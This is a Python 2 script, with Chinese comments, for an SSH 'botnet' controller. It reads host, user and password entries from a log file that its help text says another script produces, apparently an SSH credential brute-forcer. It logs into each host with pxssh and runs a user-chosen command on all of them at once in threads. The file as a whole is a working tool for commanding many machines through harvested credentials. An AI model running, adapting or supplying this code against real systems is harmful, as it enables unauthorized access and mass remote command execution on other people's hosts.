# -*- coding: utf-8 -*-
import argparse
import re
import threading
from pexpect import pxssh


lock = threading.Lock()
botNet = []


class Client:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            print 'It is the host: {} connecting'.format(self.host)
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            print 'Connect successfully!'
            return s
        except Exception, e:
            print e
            print '[-] Error Connecting'

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        # 输出连接成功执行命令后返回的信息
        return self.session.before


def botnetCommand(command, client):
    try:
        output = client.send_command(command)
    finally:
        lock.acquire()
        print '[*] Output from ' + client.host
        print '[+] ' + output + '\n'
        lock.release()


def addClient(host, user, password):
    client = Client(host, user, password)
    botNet.append(client)


def use_parser():
    parser = argparse.ArgumentParser(usage='%(prog)s is a connection of ssh',
                                     prefix_chars='+',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     description="""
Description:
    This SSH Client try to connect the host which in the file named 'log_ssh.txt'(created by 'use_pxssh_SSH1.py')
    or the host you input.
Mode:
    1. You can run as "%(prog)s +F" to open a exist file(That is 'log_ssh.txt'!)
    2. You can run as "%(prog)s +H x.x.x.x" if the host have existed in the file named 'log_ssh.txt',it will try to connect.
    3. You can run as "%(prog)s +H x.x.x.x +u xx +p xx" to appoint a host you known.
    ----------
A "++cmd xx" option:
    When you run as the three modes above,you can add the options "++cmd xx" at the end;if connect successfully,it will
    execute the cmd at the remote host!""")
    parser.add_argument('+H', dest='tgthost', type=str, help='specify the target host')
    parser.add_argument('+u', dest='user', type=str, help='specify the user')
    parser.add_argument('+p', dest='passwd', type=str, help='The password of SSH needed')
    parser.add_argument('+F', dest='file', help="Connect the host in the file named 'log_ssh.txt'", action='store_true')
    parser.add_argument('++cmd', dest='cmd', help='The cmd will execute when connect successfully!', nargs='*')
    args = parser.parse_args()
    return args


def use_file():
    with open('log_ssh.txt', 'r') as f:
        s = f.read()

    pattern = re.compile('.*?[H|h]ost:\s(.*?)\r{0,1}\n[U|u]sername:\s(.*?)\r{0,1}\n[P|p]assword:\s(.*?)\r{0,1}\n')
    result = re.findall(pattern, s)
    return result


def specify_cmd(args):
    cmd = ''
    for i in range(0, len(args.cmd)):
        cmd = cmd + args.cmd[i] + ' '
    return cmd


def multi_thread(args):
    if args.cmd is not None:
        cmd = specify_cmd(args)
        for client in botNet:
            t = threading.Thread(target=botnetCommand, args=(cmd, client))
            t.start()


def main():
    args = use_parser()
    print args
    host = args.tgthost
    user = args.user
    password = args.passwd
    if host is not None and (user and password) is None:
        results = use_file()
        for i in range(0, len(results)):
            if host == results[i][0]:
                print 'The host has a match option, it try to connect now!'
                addClient(host, results[i][1], results[i][2])
                multi_thread(args)
                exit(0)
        print 'The host has not match a option, please run as -h x.x.x.x -u xx -p xx to connect'
        exit(0)
    if (host and user and password) is not None:
        addClient(host, user, password)
        multi_thread(args)
    if ((host and user and password) is None) and args.file is True:
        a = int()
        results = use_file()
        # 检验启动连接的算法，一个host只连接一次
        for i in range(0, len(results)):
            if i == a and a != 0:  # 当a的值等于i，则跳过该相同的host不进行连接
                continue
            for j in range(0, len(results)):
                if i == j:  # 当等于本身时跳过
                    continue
                if results[i][0] == results[j][0]:
                    a = j  # 将下次出现相同位置的值传给a
                    break
            addClient(results[i][0], results[i][1], results[i][2])
        multi_thread(args)


if __name__ == '__main__':
    main()
